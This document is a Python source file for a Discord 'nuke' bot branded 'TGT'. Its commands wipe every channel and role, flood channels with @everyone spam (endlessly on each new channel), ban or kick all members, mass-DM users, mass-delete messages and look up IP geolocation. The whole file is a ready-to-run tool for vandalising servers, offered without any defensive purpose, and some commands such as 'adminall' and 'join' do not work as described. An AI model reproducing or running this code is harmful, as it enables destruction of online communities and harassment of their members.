import asyncio
import asyncio
import colorama
import json
import random
import os
import requests
import discord
from discord.ext import commands

client = commands.Bot(command_prefix="$", intents=discord.Intents.all())

@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="a level beyond you!"))
    print('''
     ▄▄▄▄▄▄▄▄▄▄▄     ▄▄▄▄▄▄▄▄▄▄▄     ▄▄▄▄▄▄▄▄▄▄▄ 
    ▐░░░░░░░░░░░▌   ▐░░░░░░░░░░░▌   ▐░░░░░░░░░░░▌
     ▀▀▀▀█░█▀▀▀▀    ▐░█▀▀▀▀▀▀▀▀▀     ▀▀▀▀█░█▀▀▀▀ 
         ▐░▌        ▐░▌                  ▐░▌     
         ▐░▌        ▐░▌ ▄▄▄▄▄▄▄▄         ▐░▌     
         ▐░▌        ▐░▌▐░░░░░░░░▌        ▐░▌     
         ▐░▌        ▐░▌ ▀▀▀▀▀▀█░▌        ▐░▌     
         ▐░▌        ▐░▌       ▐░▌        ▐░▌     
         ▐░▌      ▄ ▐░█▄▄▄▄▄▄▄█░▌ ▄      ▐░▌     
         ▐░▌     ▐░▌▐░░░░░░░░░░░▌▐░▌     ▐░▌     
          ▀       ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀       ▀      
                                                
    ╔══════════════════════════╗
    ║           Menu           ║
    ╠══════════════════════════╣
    ║ 1. Nuke                  ║
    ║ 2. Delete All Channels   ║
    ║ 3. Kick All Members      ║
    ║ 4. Role Spam             ║
    ║ 5. Delete All Emojis     ║
    ║ 6. Give Everyone Admin   ║
    ║ 7. Mass DM Users         ║
    ║ 8. IP Lookup             ║
    ║ 9. MCCP                  ║
    ║ 10. Join Server          ║
    ║ 11. Delete All Channels  ║
    ╚══════════════════════════╝
    Update: Volume 1 
    ''')

token = input("Please enter your bot token: ")
server_id = input("Please enter your server ID for logging console output: ")

# Log output to the console channel
def log_to_console_channel(message):
    server = client.get_guild(int(server_id))
    console_channel = discord.utils.get(server.text_channels, name="console")
    if console_channel:
        asyncio.ensure_future(console_channel.send(message))

######################################setup########################################

channel_names = ['NUKED BY TGT']
message_spam = ['@everyone nuked by TGT']

###################################################################################

@client.command()
async def nuke(ctx, amount=100):
    await ctx.message.delete()
    await ctx.guild.edit(name="NUKED BY TGT")
    channels = ctx.guild.channels
    for channel in channels:
        try:
            await channel.delete()
            log_to_console_channel(f"{channel.name} Has Been Successfully Deleted!")
        except:
            pass
            log_to_console_channel("Unable To Delete Channel!")
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(channel_names))
            log_to_console_channel(f"Successfully Made Channel [{i}]!")
        except:
            log_to_console_channel("Unable To Create Channel!")
    for role in ctx.guild.roles:
        try:
            await role.delete()
            log_to_console_channel(f"{role.name} Has Been Successfully Deleted!")
        except:
            log_to_console_channel(f"{role.name} Is Unable To Be Deleted")
    await asyncio.sleep(2)
    for i in range(100):
        for i in range(1000):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(random.choice(message_spam))
                    log_to_console_channel(f"{channel.name} Has Been Pinged!")
                except:
                    log_to_console_channel(f"Unable To Ping {channel.name}!")
    for member in ctx.guild.members:
        if member.id != client.user.id:
            try:
                await member.ban(reason="NUKED BY TGT")
                log_to_console_channel(f"{member.name} Has Been Successfully Banned In {ctx.guild.name}")
            except:
                log_to_console_channel(f"Unable To Ban {member.name} In {ctx.guild.name}!")

@client.event
async def on_guild_channel_create(channel):
    while True:
        await channel.send(random.choice(message_spam))

@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != client.user.id:
            try:
                await ctx.guild.ban(member)
                log_to_console_channel(f"{member.name} Has Been Successfully Banned In {ctx.guild.name}")
            except:
                log_to_console_channel(f"Unable To Ban {member.name} In {ctx.guild.name}!")

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if member.id != client.user.id:
            try:
                await member.kick(reason="NUKED TGT")
                log_to_console_channel(f"{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
            except:
                log_to_console_channel(f"Unable To Kick {member.name} In {ctx.guild.name}!")

@client.command()
async def rolespam(ctx):
    await ctx.message.delete()
    for i in range(1, 250):
        try:
            await ctx.guild.create_role(name=f"NUKED")
            log_to_console_channel(f"Successfully Created Role In {ctx.guild.name}!")
        except:
            log_to_console_channel(f"Unable To Create Roles In {ctx.guild.name}!")

@client.command(pass_context=True)
async def emojidel(ctx):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        try:
            await emoji.delete()
            log_to_console_channel(f"{emoji.name} Has Been Successfully Deleted In {ctx.guild.name}!")
        except:
            log_to_console_channel(f"{emoji.name} Is Unable To Be Deleted In {ctx.guild.name}!")

@client.command()
async def adminall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.edit(roles=[], reason="NUKED TGT")
            log_to_console_channel(f"Gave Everyone Admin In {ctx.guild.name}!")
        except:
            log_to_console_channel(f"Unable To Give Everyone Admin In {ctx.guild.name}!")

@client.command(pass_context=True)
async def massdm(ctx, *, message=None):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await asyncio.sleep(0.2)
            await member.send(message)
            log_to_console_channel(f"Sent Mass DM In {ctx.guild.name}!")
        except:
            log_to_console_channel(f"Unable To Send Mass DM In {ctx.guild.name}!")

@client.command()
async def ip(ctx, *, ip):
    await ctx.message.delete()
    r = requests.get(f"http://ip-api.com/json/{ip}")
    geo = json.loads(r.content)
    embed = discord.Embed(title="IP Lookup", description=f"**IP: `{geo['query']}`**", color=0x000000)
    embed.add_field(name="Status", value=f"**{geo['status']}**", inline=True)
    embed.add_field(name="Region", value=f"**{geo['regionName']}**", inline=True)
    embed.add_field(name="City", value=f"**{geo['city']}**", inline=True)
    embed.add_field(name="ZIP", value=f"**{geo['zip']}**", inline=True)
    embed.add_field(name="ISP", value=f"**{geo['isp']}**", inline=True)
    embed.add_field(name="ORG", value=f"**{geo['org']}**", inline=True)
    embed.set_footer(text=f"Requested by {ctx.message.author.name}")
    await ctx.send(embed=embed)
    log_to_console_channel(f"IP Lookup - {ip}")

@client.command()
async def mccp(ctx, num=100):
    await ctx.message.delete()
    counter = 0
    for channel in ctx.guild.text_channels:
        try:
            async for message in channel.history(limit=num):
                await message.delete()
                counter += 1
            log_to_console_channel(f"Deleted {counter} messages in {channel.name}")
            counter = 0
        except:
            log_to_console_channel(f"Unable to delete messages in {channel.name}")

@client.command()
async def join(ctx, invite_link):
    try:
        invite = await client.get_invite(invite_link)
        guild = invite.guild
        text_channel = guild.text_channels[0]  # Assuming you want to join the first text channel in the guild
        await text_channel.send("I have joined the server!")
    except discord.errors.HTTPException:
        await ctx.send("Invalid invite link.")
    except discord.errors.ClientException:
        await ctx.send("Already connected to a text channel.")


@client.command()
async def deleteall(ctx):
    await ctx.message.delete()

    # Delete all channels
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
            log_to_console_channel(f"{channel.name} Has Been Successfully Deleted!")
        except:
            pass
            log_to_console_channel("Unable To Delete Channel!")

    # Create a new text channel
    try:
        await ctx.guild.create_text_channel("Fucked by TGT")
        log_to_console_channel("Successfully Created Channel!")
    except:
        log_to_console_channel("Unable To Create Channel!")

@client.command()
async def bhelp(ctx):
    embed = discord.Embed(title="TGT OFFICIAL", color=0x00ff00)
    embed.add_field(name="1. nuke [amount]", value="Nuke the server by deleting all channels, creating new channels, spamming messages, and banning members.", inline=False)
    embed.add_field(name="2. banall", value="Ban all members in the server.", inline=False)
    embed.add_field(name="3. kickall", value="Kick all members in the server.", inline=False)
    embed.add_field(name="4. rolespam", value="Create multiple roles in the server.", inline=False)
    embed.add_field(name="5. emojidel", value="Delete all emojis in the server.", inline=False)
    embed.add_field(name="6. adminall", value="Give everyone admin privileges in the server.", inline=False)
    embed.add_field(name="7. massdm [message]", value="Send a mass DM to all members in the server.", inline=False)
    embed.add_field(name="8. ip [ip_address]", value="Lookup information about an IP address.", inline=False)
    embed.add_field(name="9. mccp [num]", value="Mass delete messages in all text channels.", inline=False)
    embed.add_field(name="10. join [invite_link]", value="Join a server using an invite link.", inline=False)
    embed.add_field(name="11. deleteall", value="Delete all channels and create a new text channel.", inline=False)
    await ctx.send(embed=embed)

client.run(token)
